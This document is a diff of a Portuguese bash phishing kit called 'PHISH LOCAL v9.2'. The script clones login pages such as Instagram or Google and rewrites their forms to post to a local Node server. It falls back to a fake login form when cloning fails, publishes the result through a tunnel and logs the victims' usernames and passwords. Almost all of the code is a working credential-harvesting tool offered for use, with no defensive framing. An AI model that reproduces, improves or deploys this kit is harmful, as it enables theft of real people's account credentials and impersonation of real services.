@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISH LOCAL v9 - Universal Wordlist
+# 🎣 PHISH LOCAL v9.2 - Universal Wordlist
 # Captura QUALQUER campo de QUALQUER site
 # Cloudflare Tunnel | Sem root | Sem login
 # ============================================
@@ -8,171 +8,106 @@
 SITE_DIR="site_clone"
 LOG_FILE="capturas.txt"
 SERVER_FILE="server/server.js"
-mkdir -p "$SITE_DIR" server
 
-# Verificar node
-if ! command -v node &>/dev/null; then
-    echo "[!] Node.js nao encontrado. Rode: pkg install nodejs -y"
-    exit 1
-fi
-
-# =============================================
-# WORDLIST - Nomes comuns de campos de login
-# =============================================
-WORDLIST=(
-    "login" "signin" "sign_in" "log_in" "entrar" "acessar" "acesso"
-    "sign-in" "log-in" "singin" "sing_in" "iniciar_sessao" "iniciar"
-    "cadastrar" "cadastro" "registrar" "registro" "criar_conta"
-    "create_account" "subscribe" "inscricao" "username" "user_name"
-    "user-name" "usuario" "nome" "name" "email" "e-mail" "mail"
-    "telefone" "phone" "telemovel" "celular" "cpf" "cnpj" "documento"
-    "rg" "identificacao" "matricula" "identification" "identifier"
-    "login_id" "loginid" "userid" "user" "uname" "nick" "nickname"
-    "login_email" "login_phone" "password" "senha" "pass" "passwd"
-    "pwd" "palavra" "chave" "secret" "pin" "codigo" "fullname"
-    "first_name" "lastname" "sobrenome" "social_name" "razao_social"
-    "mae" "pai" "data" "date" "nascimento" "birth" "birthdate"
-    "ano" "mes" "dia" "endereco" "endereco" "rua" "avenida" "address"
-    "street" "cep" "zip" "zipcode" "bairro" "cidade" "cidade" "pais"
-    "country" "complemento" "empresa" "company" "trabalho" "profissao"
-    "escola" "school" "universidade" "university" "curso" "course"
-    "departamento" "department" "cargo" "cartao" "card" "credit_card"
-    "cvv" "validade" "conta" "account" "banco" "bank" "agencia" "pix"
-    "token" "otp" "verification" "captcha" "2fa" "auth" "pergunta"
-    "resposta" "termos" "terms" "privacidade" "privacy" "aceitar"
-    "remember" "newsletter" "linguagem" "language" "pais" "country"
-    "genero" "sexo" "gender" "estado civil" "civil status" "casado"
-    "solteiro" "numero" "number" "andap" "andar" "apartamento" "ap"
-    "complemento" "bloco" "unidade" "disciplina" "subject" "materia"
-    "professor" "docente" "teacher" "nota" "grade" "score" "media"
-    "mensagem" "message" "comentario" "comment" "observacao" "link"
-    "url" "website" "site" "imagem" "foto" "image" "picture" "upload"
-    "arquivo" "file" "anexo" "attachment" "valor" "value" "preco"
-    "price" "quantidade" "qtd" "total" "tipo" "type" "categoria"
-    "category" "status" "situacao" "state" "acao" "action" "operacao"
-    "operation" "id" "uuid" "chave" "key" "hash" "campo" "field"
-    "input" "descricao" "description" "titulo" "title" "assunto" "subject"
-    "titulo" "mensagem" "message" "data" "date" "hora" "time" "periodo"
-)
-
-# Converter wordlist para JSON
-WORDLIST_JSON="["
-for w in "${WORDLIST[@]}"; do
-    WORDLIST_JSON+="\"$w\","
-done
-WORDLIST_JSON="${WORDLIST_JSON%,}]"
-
-# =============================================
-# MENU PRINCIPAL
-# =============================================
+# Resultados
 clear
 echo ""
 echo "=========================================="
-echo "     PHISH LOCAL v9 - Universal Wordlist"
+echo "  🎣 PHISH LOCAL v9.2"
 echo "=========================================="
 echo ""
 echo "  1) Criar phishing"
 echo "  2) Ver capturas"
-echo "  3) Limpar site"
+echo "  3) Limpar capturas"
 echo "  4) Sair"
 echo ""
 echo -n "Escolha: "
-read MENU
+read CHOICE
 
-if [ "$MENU" = "1" ]; then
-
+case "$CHOICE" in
+1)
+    # --- ESCOLHER ALVO ---
     echo ""
-    echo "=========================================="
-    echo "  CONFIGURAR PHISHING"
-    echo "=========================================="
-    echo ""
-    echo "Qual site de login voce quer clonar?"
-echo ""
-echo "  - https://www.instagram.com"
-echo "  - https://www.facebook.com"
-echo "  - https://accounts.google.com"
-echo "  - https://login.live.com"
-echo "  - OU QUALQUER outro site de login"
-echo ""
-echo -n "URL do site: "
-read TARGET_URL
-[ -z "$TARGET_URL" ] && echo "URL vazia!" && exit 1
-[[ ! "$TARGET_URL" =~ ^https?:// ]] && TARGET_URL="https://$TARGET_URL"
+    echo -n "URL do site (ex: https://instagram.com): "
+    read URL
 
-echo ""
-echo "Que nome voce quer pro link?"
-echo "  Ex: instagram, facebook, gmail, autocarlocadora"
-echo -n "Nome: "
-read LOCAL_NAME
-[ -z "$LOCAL_NAME" ] && LOCAL_NAME="login"
+    URL=$(echo "$URL" | tr -d '\r' | xargs)
+    [ -z "$URL" ] && URL="https://instagram.com"
 
-echo ""
-echo "Porta [8080]: "
-echo -n "> "
-read PORT
-[ -z "$PORT" ] && PORT=8080
-
-echo ""
-echo "Redirecionar pra onde depois do login?"
-echo -n "URL: "
-read REDIRECT_URL
-[ -z "$REDIRECT_URL" ] && REDIRECT_URL="$TARGET_URL"
-[[ ! "$REDIRECT_URL" =~ ^https?:// ]] && REDIRECT_URL="https://$REDIRECT_URL"
-
-    # --- CLONAR SITE ---
-    clear
-    echo ""
-    echo "[...] Clonando $TARGET_URL"
-    echo ""
-    rm -rf "$SITE_DIR"/*
-
-    curl -s -L -o "$SITE_DIR/index.html" \
-        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
-        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
-        -H "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8" \
-        "$TARGET_URL" 2>/dev/null
-
-    if [ ! -f "$SITE_DIR/index.html" ] || [ $(wc -c < "$SITE_DIR/index.html") -lt 100 ]; then
-        echo "[AVISO] Nao foi possivel clonar. Usando pagina generica."
-        touch "$SITE_DIR/index.html"
+    if ! echo "$URL" | grep -qE '^https?://'; then
+        URL="https://$URL"
     fi
 
-    echo "[...] Baixando recursos..."
-    for css in $(grep -oE 'href="[^"]*\.css"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//'); do
-        fname=$(basename "$css")
-        [ -f "$SITE_DIR/$fname" ] && continue
-        if [[ "$css" == http* ]]; then
-            curl -s -L -o "$SITE_DIR/$fname" "$css" 2>/dev/null
-        elif [[ "$css" == /* ]]; then
-            BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
-            curl -s -L -o "$SITE_DIR/$fname" "$BASE$css" 2>/dev/null
-        fi
-    done
+    DOMAIN=$(echo "$URL" | sed -E 's|https?://||;s|/.*||')
+    echo ""
+    echo "[!] Alvo: $URL"
+    echo "[!] Dominio: $DOMAIN"
+    echo ""
+    echo -n "Nome pra URL (ex: autocarlocadora): "
+    read NAME
+    NAME=$(echo "$NAME" | tr -d '\r' | xargs | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]//g')
+    [ -z "$NAME" ] && NAME="login"
+    URL_NAME="${NAME}.com.br"
+    echo "[!] URL falsa: https://${URL_NAME}"
 
-    for js in $(grep -oE 'src="[^"]*\.js"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
-        fname=$(basename "$js")
-        [ -f "$SITE_DIR/$fname" ] && continue
-        if [[ "$js" == http* ]]; then
-            curl -s -L -o "$SITE_DIR/$fname" "$js" 2>/dev/null
-        elif [[ "$js" == /* ]]; then
-            BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
-            curl -s -L -o "$SITE_DIR/$fname" "$BASE$js" 2>/dev/null
-        fi
-    done
+    # --- CLONAR SITE ---
+    echo ""
+    echo "[...] Clonando site..."
+    rm -rf "$SITE_DIR"
+    mkdir -p "$SITE_DIR"
 
-    for img in $(grep -oE 'src="[^"]*\.(png|jpg|jpeg|gif|svg|webp)"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
-        fname=$(basename "$img")
-        [ -f "$SITE_DIR/$fname" ] && continue
-        if [[ "$img" == http* ]]; then
+    USER_AGENT="Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
+
+    curl -s -L -H "User-Agent: $USER_AGENT" -o "$SITE_DIR/index.html" "$URL" 2>/dev/null
+
+    if [ ! -s "$SITE_DIR/index.html" ]; then
+        echo "[!] Nao foi possivel clonar. Usando pagina de login padrao."
+        cat > "$SITE_DIR/index.html" << 'EOF'
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Login</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}
+h1{font-size:44px;font-weight:300;margin-bottom:30px}
+input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}
+input:focus{border-color:#a8a8a8}
+button{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}
+button:active{background:#1877f2}
+</style>
+</head>
+<body>
+<div class="card"><h1>Login</h1>
+<form method="POST"action="/login">
+<input type="text" name="username" placeholder="Usuario ou email" required>
+<input type="password" name="password" placeholder="Senha" required>
+<button type="submit">Entrar</button>
+</form></div>
+</body>
+</html>
+EOF
+    fi
+
+    # baixar imagens/css
+    grep -oE 'url\([^)]+\)' "$SITE_DIR/index.html" 2>/dev/null | head -20 | while read -r img; do
+        img=$(echo "$img" | sed -E 's/url\("//;s/"\)//')
+        if echo "$img" | grep -qE '\.(css|png|jpg|jpeg|gif|svg|ico)'; then
+            if echo "$img" | grep -qE '^//'; then
+                img="https:$img"
+            elif echo "$img" | grep -qvE '^https?://'; then
+                img="${URL%/}/$img"
+            fi
+            fname=$(basename "$img" | sed 's/[^a-zA-Z0-9._-]/_/g')
             curl -s -L -o "$SITE_DIR/$fname" "$img" 2>/dev/null
-        elif [[ "$img" == /* ]]; then
-            BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
-            curl -s -L -o "$SITE_DIR/$fname" "$BASE$img" 2>/dev/null
         fi
     done
 
-    sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html"
-    sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"
+    sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html" 2>/dev/null
+    sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html" 2>/dev/null
 
     echo ""
     echo "[OK] Site clonado!"
@@ -255,9 +190,6 @@ http.createServer((req,res)=>{
     });
 }).listen(PORT,'0.0.0.0',()=>console.log('Servidor ativo porta '+PORT));
 SERVEREOF
-
-    # Substituir placeholder da wordlist
-    sed -i "s/PLACEHOLDER_WORDLIST/$WORDLIST_JSON/" "$SERVER_FILE"
 
     # --- OBTER IP ---
     IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
@@ -358,45 +290,55 @@ SERVEREOF
     echo "[*] Iniciando servidor..."
     echo ""
 
-    REDIRECT="$REDIRECT_URL" PORT="$PORT" node "$SERVER_FILE"
+    # --- INICIAR SERVIDOR ---
+    node "$SERVER_FILE" &
+    SERVER_PID=$!
 
-    [ -n "$CF_PID" ] && kill $CF_PID 2>/dev/null
-
-    echo ""
-    echo "[*] Servidor parado."
-    echo ""
-    echo -n "Ver capturas? (s/n): "
-    read V
-    echo ""
-    if [ "$V" = "s" ] || [ "$V" = "S" ]; then
-        if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
-            echo "=========================================="
-            cat "$LOG_FILE"
-            echo ""
-            echo "=========================================="
-        else
-            echo "Nenhuma captura."
-        fi
-    fi
-
-elif [ "$MENU" = "2" ]; then
-    echo ""
-    if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
-        echo "=========================================="
-        cat "$LOG_FILE"
+    # Se tiver cloudflare, mostrar URL de novo apos 2s
+    if [ -n "$CF_URL" ]; then
+        sleep 2
         echo ""
-        echo "=========================================="
-    else
-        echo "Nenhuma captura."
+        echo "  🔥 LEMBRE-SE - URL da VITIMA:"
+        echo "    ${CF_URL}"
+        echo ""
     fi
 
-elif [ "$MENU" = "3" ]; then
-    rm -rf "$SITE_DIR"/*
-    echo "[OK] Site removido."
+    echo ""
+    echo "Aguardando capturas... (Ctrl+C para parar)"
+    echo ""
 
-elif [ "$MENU" = "4" ]; then
+    wait $SERVER_PID
+    ;;
+
+2)
+    echo ""
+    echo "=========================================="
+    echo "  CAPTURAS"
+    echo "=========================================="
+    echo ""
+    if [ -f "$LOG_FILE" ]; then
+        cat "$LOG_FILE"
+    else
+        echo "Nenhuma captura ainda."
+    fi
+    echo ""
+    echo "Pressione ENTER para voltar..."
+    read
+    ;;
+
+3)
+    > "$LOG_FILE"
+    echo "[OK] Capturas limpas!"
+    sleep 1
+    ;;
+
+4)
+    echo "Saindo..."
     exit 0
+    ;;
 
-else
+*)
     echo "Opcao invalida!"
-fi
+    sleep 1
+    ;;
+esac
